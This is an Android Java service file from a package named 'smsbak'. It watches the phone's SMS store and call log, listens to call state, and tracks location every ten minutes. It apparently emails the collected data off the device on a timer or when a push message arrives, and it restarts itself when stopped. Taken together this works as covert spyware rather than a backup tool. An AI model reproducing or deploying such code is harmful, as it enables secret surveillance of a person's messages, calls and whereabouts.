package com.smsbak.sms;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Timer;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import cn.jpush.android.api.JPushInterface;

import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;

public class BootServer extends Service {


	

	public static Timer timer;
	public static File file;
	public static long tosend = 1000 * 60 * 60;// 30个分钟发送扫描一次 发送
	public static SimpleDateFormat smf=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	private LocationClient lc;
	private BDLocationListenerImpl bdlocation;
	private LocationClientOption option;
	private AlarmManager am;
	private SendMail sm;
	private SmsSqlUtils su;
	private TelephonyManager tm;
	private PhoneStateListenerImpl listener;
	public static int send=200;
	public static boolean writeSDcard = true;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		file = new File(this.getExternalCacheDir() ,"smsbak");
		if (!file.exists()) {
			file.mkdirs();
		}
		su = new SmsSqlUtils(this.getApplicationContext());
		su.savelog("message", "服务启动");
		
		su.savelog("message", "发送对象创建");

		sm = new SendMail(this.getApplicationContext(), su);
		if (SendMail.key.equals(sm.getPublicKey())) {
			su.savelog("message", "百度地图初始化");
			option = new LocationClientOption();
			option.setAddrType("all");
			option.setCoorType("bd09ll");
			lc = new LocationClient(this.getApplicationContext());
			lc.setLocOption(option);
			bdlocation = new BDLocationListenerImpl(su);
			lc.registerLocationListener(bdlocation);
			lc.start();

			am = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);

			su.savelog("message", "注册数据触发器");
			ContentResolver cr = this.getContentResolver();
			SMSConten content = new SMSConten(cr, handler, su);
			this.getContentResolver().registerContentObserver(
					Uri.parse("content://sms/"), true, content);
			CallConten clcontent = new CallConten(cr, handler, su);
			this.getContentResolver().registerContentObserver(
					CallLog.Calls.CONTENT_URI, true, clcontent);
			su.savelog("message", "注册通话监听");
			tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
			listener = new PhoneStateListenerImpl(this,clcontent);
			tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);

			su.savelog("message", "注册广播接收器");
			IntentFilter filter = new IntentFilter();
			filter.addAction("com.yfm.sms.sendmail");
			filter.addAction("com.yfm.sms.location");
			this.registerReceiver(new AlarmReceiver(), filter);

			su.savelog("message", "极光推送初始化");
			JPushInterface.setDebugMode(true);
			JPushInterface.init(getApplicationContext());
			JPushInterface.resumePush(this);
			su.savelog("message", "发送邮件定时器初始化");
			Intent send = new Intent("com.yfm.sms.sendmail");
			PendingIntent pi = PendingIntent.getBroadcast(this, 0, send,
					PendingIntent.FLAG_UPDATE_CURRENT);
			long triggerAtTime = SystemClock.elapsedRealtime() + 3 * 1000;
			am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
					triggerAtTime, tosend, pi);

			su.savelog("message", "定时获取位置初始化");
			Intent location = new Intent("com.yfm.sms.location");
			PendingIntent locationintent = PendingIntent.getBroadcast(this, 0,
					location, PendingIntent.FLAG_UPDATE_CURRENT);
			long locationAtTime = SystemClock.elapsedRealtime() + 2 * 1000;
			am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
					locationAtTime, 1000 * 60 * 10, locationintent);
			
		}

	}

	public void TeleInit() {
		
	}
	
	class AlarmReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();

			if (action != null && "com.yfm.sms.sendmail".equals(action)) {
				su.savelog("message", "接收到广播发送邮件");
				SendMailThread smt = new SendMailThread(sm);
				smt.start();
			}
			if (action != null && "com.yfm.sms.location".equals(action)) {
				if (lc != null && lc.isStarted()) {
					su.savelog("message", "接收到广播获取位置");
					lc.requestLocation();
				}
			}
		}
	}
	private Handler handler=new Handler(){

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			if(msg.what==send&&SendMail.promptly){
				su.savelog("message", "接收到指令发送邮件");
				SendMailThread smt = new SendMailThread(sm);
				smt.start();
			}
		}
		
	};

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		su.savelog("message", "服务关闭");
		Intent localIntent = new Intent();
		localIntent.setClass(this, BootServer.class); // 销毁时重新启动Service
		this.startService(localIntent);
	}
	public int onStartCommand(Intent intent, int flags, int startId) {        
		   return START_STICKY;    
	}
}
